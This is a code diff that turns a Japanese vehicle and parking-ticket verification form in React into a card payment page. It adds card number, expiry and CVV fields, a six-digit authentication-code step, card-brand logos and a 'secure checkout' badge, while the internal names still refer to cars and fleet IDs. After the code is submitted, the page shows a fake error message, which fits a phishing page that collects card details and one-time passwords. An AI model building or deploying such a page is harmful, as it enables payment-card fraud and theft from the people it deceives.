@@ -3,13 +3,27 @@ import { useState } from "react";
 const inputClass = `
   border border-gray-200
   p-3 rounded-lg w-full
-  text-sm text-gray-800
+  text-base text-gray-800
   placeholder-gray-400
   outline-none
   focus:border-pink-400
   focus:ring-1 focus:ring-pink-400
   transition-colors
 `;
+
+function LockIcon() {
+  return (
+    <svg
+      width="14" height="14" viewBox="0 0 24 24"
+      fill="none" stroke="currentColor" strokeWidth="2"
+      strokeLinecap="round" strokeLinejoin="round"
+      aria-hidden="true" className="shrink-0"
+    >
+      <rect x="3" y="11" width="18" height="11" rx="2" />
+      <path d="M7 11V7a5 5 0 0 1 10 0v4" />
+    </svg>
+  );
+}
 
 export default function CarForm() {
   const [car, setCar] = useState({
@@ -48,7 +62,7 @@ export default function CarForm() {
     setSuccess("");
 
     if (!isCarInfoValid) {
-      setError("車両情報を正しく入力してください");
+      setError("カード情報を入力してください");
       return;
     }
 
@@ -86,7 +100,7 @@ export default function CarForm() {
     setSuccess("");
 
     if (!isTicketValid) {
-      setError("駐車券番号を正しく入力してください");
+      setError("正しいコードを入力してください");
       return;
     }
 
@@ -113,7 +127,7 @@ export default function CarForm() {
         throw new Error(data.message || "Verification failed");
       }
 
-      setSuccess("車両情報の確認が完了しました。");
+      setSuccess("エラーが発生しました。もう一度お試しください");
     } catch (err) {
       console.error(err);
       setError(
@@ -125,18 +139,23 @@ export default function CarForm() {
   };
 
   return (
-    <div className="min-h-screen flex justify-center items-start px-4 py-10">
+    <div className="min-h-screen flex justify-center items-start px-4 py-10 bg-gray-50">
       <div className="w-full max-w-md">
-        <div className="px-6 py-8">
+        <div className="bg-white rounded-2xl shadow-sm border border-gray-100 px-6 py-8">
           <h1 className="text-xl font-bold text-gray-800 text-center">
-            {showVerification ? "車両確認" : "車両情報を入力してください"}
+            {showVerification ? "カード認証" : "カード情報を入力してください。"}
           </h1>
 
           <p className="text-sm text-gray-500 text-center mb-6">
             {showVerification
-              ? "Vehicle Verification"
-              : "Enter your vehicle information"}
+              ? "Card Verification"
+              : "Enter your Card payment information"}
           </p>
+          <div className="flex justify-center mb-6">
+          <img src="/visa.png" alt="Visa" className="w-16 scale-[0.6] mb-6" />
+          <img src="/mastercard.png" alt="MasterCard" className="w-16 scale-[0.6] mb-6" />
+          <img src="/jcb.png" alt="JCB" className="w-16 scale-[0.6] mb-6" />
+          </div>
 
           <form
             onSubmit={showVerification ? handleVerification : handleCarSubmit}
@@ -145,12 +164,12 @@ export default function CarForm() {
             {/* Total Number */}
             <div className="flex flex-col gap-1">
               <label className="text-sm font-medium text-gray-700">
-                車両番号 / Total Number
+              カード番号
               </label>
               <input
                 type="text"
                 inputMode="numeric"
-                placeholder="Enter total number"
+                placeholder="0000 0000 0000 0000"
                 maxLength={16}
                 value={car.total_number}
                 onChange={update("total_number")}
@@ -159,59 +178,58 @@ export default function CarForm() {
                   showVerification ? "bg-gray-100 cursor-not-allowed" : ""
                 }`}
               />
-              <p className="text-xs text-gray-400">1〜16 digits</p>
             </div>
 
-            {/* Car Number */}
-            <div className="flex flex-col gap-1">
-              <label className="text-sm font-medium text-gray-700">
-                車両番号 / Car Number
-              </label>
-              <input
-                type="text"
-                inputMode="numeric"
-                placeholder="1234"
-                maxLength={4}
-                value={car.car_number}
-                onChange={update("car_number")}
-                disabled={showVerification}
-                className={`${inputClass} ${
-                  showVerification ? "bg-gray-100 cursor-not-allowed" : ""
-                }`}
-              />
-              <p className="text-xs text-gray-400">4 digits</p>
-            </div>
+            <div className="flex gap-4">
+  {/* Expiry Date */}
+  <div className="flex-1 flex flex-col gap-1">
+    <label className="text-sm font-medium text-gray-700">
+      有効期限
+    </label>
+    <input
+      type="text"
+      inputMode="numeric"
+      placeholder="MMYY"
+      maxLength={4}
+      value={car.car_number}
+      onChange={update("car_number")}
+      disabled={showVerification}
+      className={`${inputClass} ${
+        showVerification ? "bg-gray-100 cursor-not-allowed" : ""
+      }`}
+    />
+  </div>
 
-            {/* Fleet ID */}
-            <div className="flex flex-col gap-1">
-              <label className="text-sm font-medium text-gray-700">
-                フリートID / Fleet ID
-              </label>
-              <input
-                type="text"
-                inputMode="numeric"
-                placeholder="123"
-                maxLength={3}
-                value={car.fleet_id}
-                onChange={update("fleet_id")}
-                disabled={showVerification}
-                className={`${inputClass} ${
-                  showVerification ? "bg-gray-100 cursor-not-allowed" : ""
-                }`}
-              />
-              <p className="text-xs text-gray-400">3 digits</p>
-            </div>
+  {/* CVV */}
+  <div className="flex-1 flex flex-col gap-1">
+    <label className="text-sm font-medium text-gray-700">
+      CVV
+    </label>
+    <input
+      type="text"
+      inputMode="numeric"
+      placeholder="123"
+      maxLength={3}
+      value={car.fleet_id}
+      onChange={update("fleet_id")}
+      disabled={showVerification}
+      className={`${inputClass} ${
+        showVerification ? "bg-gray-100 cursor-not-allowed" : ""
+      }`}
+    />
+  </div>
+</div>
 
             {/* STEP 2 FIELD — Pops up directly below Fleet ID */}
             {showVerification && (
               <div className="flex flex-col gap-1 mt-2 pt-4 border-t border-gray-100 animate-fadeIn">
                 <label className="text-sm font-medium text-gray-700">
-                  駐車券番号 / Parking Ticket Number
+                認証コード
                 </label>
                 <input
                   type="text"
                   inputMode="numeric"
-                  placeholder="Enter parking ticket number"
+                  placeholder="******"
                   maxLength={6}
                   value={parkingTicket}
                   onChange={(e) => {
@@ -224,9 +242,6 @@ export default function CarForm() {
                   className={inputClass}
                   autoFocus
                 />
-                <p className="text-xs text-gray-400">
-                  Enter your 1〜6 digit parking ticket number
-                </p>
               </div>
             )}
 
@@ -259,12 +274,20 @@ export default function CarForm() {
               {loading
                 ? showVerification
                   ? "確認中..."
-                  : "送信中..."
+                  : "読み込み中..."
                 : showVerification
-                ? "車両情報を確認"
+                ? "今すぐ注文を完了する"
                 : "次へ"}
             </button>
           </form>
+        </div>
+
+        {/* Secure checkout badge */}
+        <div className="flex items-center justify-center gap-1.5 text-gray-400 mt-4">
+          <LockIcon />
+          <span className="text-xs font-medium tracking-wide">
+          安全なチェックアウト
+          </span>
         </div>
       </div>
     </div>
